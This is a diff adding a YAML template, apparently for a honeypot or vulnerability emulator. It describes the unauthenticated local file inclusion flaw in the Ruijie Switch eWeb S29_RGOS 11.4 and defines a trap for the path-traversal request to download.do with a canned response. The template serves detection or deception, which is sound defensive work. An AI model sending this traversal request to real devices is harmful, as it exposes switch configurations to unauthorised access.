@@ -1,0 +1,27 @@
+id: ruijie-networks-lfi
+info:
+  name: Ruijie Networks Switch eWeb S29_RGOS 11.4 - Local File Inclusion
+  author: pikpikcu
+  description: Ruijie Networks Switch eWeb S29_RGOS 11.4 is vulnerable to local file
+    inclusion and allows remote unauthenticated attackers to access locally stored
+    files and retrieve their content via the 'download.do' endpoint.
+  severity: high
+  reference:
+  - https://exploit-db.com/exploits/48755
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  metadata:
+    max-request: 1
+  tags: ruijie,lfi,edb
+traps:
+- request:
+    method: GET
+    path: /download.do?file=../../../../config.text
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: version S29_RGOS 11.4
